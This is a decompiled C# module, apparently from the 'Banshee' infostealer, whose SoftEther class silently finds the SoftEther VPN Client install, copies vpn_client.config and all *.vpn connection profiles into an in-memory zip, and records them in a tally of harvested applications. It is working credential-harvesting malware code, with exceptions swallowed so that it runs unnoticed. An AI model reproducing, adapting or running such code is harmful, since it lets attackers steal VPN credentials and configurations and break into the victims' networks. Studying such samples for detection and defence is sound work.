﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000037 RID: 55
	public class SoftEther : ITarget
	{
		// Token: 0x06000073 RID: 115 RVA: 0x0000476C File Offset: 0x0000476C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "SoftEther VPN Client");
			if (!Directory.Exists(text))
			{
				return;
			}
			string text2 = ZipPath.Vpn("SoftEther");
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "SoftEther VPN";
			string text3 = Path.Combine(text, "vpn_client.config");
			if (File.Exists(text3))
			{
				try
				{
					string text4 = Path.Combine(text2, "vpn_client.config");
					zip.AddFile(text4, File.ReadAllBytes(text3));
					counterApplications.Files.Add(text3 + " => " + text4);
				}
				catch
				{
				}
			}
			foreach (string text5 in Directory.GetFiles(text, "*.vpn", SearchOption.TopDirectoryOnly))
			{
				try
				{
					string fileName = Path.GetFileName(text5);
					string text6 = Path.Combine(text2, fileName);
					zip.AddFile(text6, File.ReadAllBytes(text5));
					counterApplications.Files.Add(text5 + " => " + text6);
				}
				catch
				{
				}
			}
			if (counterApplications.Files.Count > 0)
			{
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
